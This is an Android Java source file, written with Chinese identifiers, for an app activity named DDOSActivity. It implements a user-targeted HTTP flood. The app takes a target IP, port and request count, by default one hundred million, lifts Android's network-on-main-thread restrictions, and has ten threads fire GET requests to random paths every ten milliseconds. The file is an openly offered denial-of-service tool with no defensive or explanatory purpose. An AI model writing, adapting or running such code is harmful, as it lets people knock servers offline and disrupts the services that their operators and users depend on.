package cn.ctkqiang.huaxiahongke;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.os.StrictMode;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDOSActivity extends AppCompatActivity
{
    private static final String TAG = "DDOSActivity";

    private String 主机 = "";
    private String IP = "";
    private int 端口 = 80;
    private int 请求数 = 100000000;
    private ExecutorService 执行器服务;

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);

        Objects.requireNonNull(this.getSupportActionBar()).hide();
        this.setContentView(R.layout.activity_ddosactivity);

        this.设置条件();
    }

    private void 设置条件()
    {
        StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().permitAll().build());
    }

    public void 开始攻击(View view)
    {
        // 获取 EditText 中的输入
        EditText ip编辑框 = findViewById(R.id.ipEditText);
        EditText 端口编辑框 = findViewById(R.id.portEditText);
        EditText 请求数编辑框 = findViewById(R.id.requestsEditText);

        IP = ip编辑框.getText().toString().trim();

        if (IP.isEmpty())
        {
            IP = 解析主机IP(主机); // 如果没有提供 IP，则从主机解析 IP
        }

        try
        {
            端口 = Integer.parseInt(端口编辑框.getText().toString().trim());
        } catch (NumberFormatException e)
        {
            端口 = 80; // 如果输入无效，则使用默认端口
        }
        try
        {
            请求数 = Integer.parseInt(请求数编辑框.getText().toString().trim());
        } catch (NumberFormatException e)
        {
            请求数 = 100000000; // 默认请求数
        }

        // 在后台启动 DDoS 攻击
        执行器服务 = Executors.newFixedThreadPool(10);  // 使用 10 个线程的线程池
        启动Ddos攻击();

        // 更新状态
        TextView 状态文本 = findViewById(R.id.statusTextView);
        状态文本.setText("攻击已开始，目标：" + 主机 + "，IP: " + IP);
    }

    private String 解析主机IP(String 主机)
    {
        // 如果没有提供 IP，则从主机解析 IP
        try
        {
            return java.net.InetAddress.getByName(主机).getHostAddress();
        } catch (Exception e)
        {
            e.printStackTrace();
            return "";
        }
    }

    private void 启动Ddos攻击()
    {
        Toast.makeText(this, "开始攻击 " + 主机 + "，IP: " + IP, Toast.LENGTH_SHORT).show();

        for (int i = 0; i < 请求数; i++)
        {
            执行器服务.execute(new Runnable()
            {
                @Override
                public void run()
                {
                    攻击();
                }
            });

            // 调整这个 sleep 时间会影响每秒请求数
            try
            {
                Thread.sleep(10); // 0.01 秒延迟
            } catch (InterruptedException e)
            {
                e.printStackTrace();
            }
        }
    }

    private void 攻击()
    {
        String url路径 = 生成Url路径();

        try
        {
            URL url = new URL("http://" + IP + "/" + url路径);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);

            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(("GET /" + url路径 + " HTTP/1.1\nHost: " + 主机 + "\n\n").getBytes());
            outputStream.flush();
            outputStream.close();

            int 响应码 = connection.getResponseCode();
            System.out.println("响应码: " + 响应码);

        } catch (Exception e)
        {
            e.printStackTrace();
            Toast.makeText(this, "连接错误: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private String 生成Url路径()
    {
        String 字符集 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+";
        Random 随机 = new Random();
        StringBuilder 路径 = new StringBuilder();

        for (int i = 0; i < 5; i++)
        {
            路径.append(字符集.charAt(随机.nextInt(字符集.length())));
        }

        return 路径.toString();
    }

}
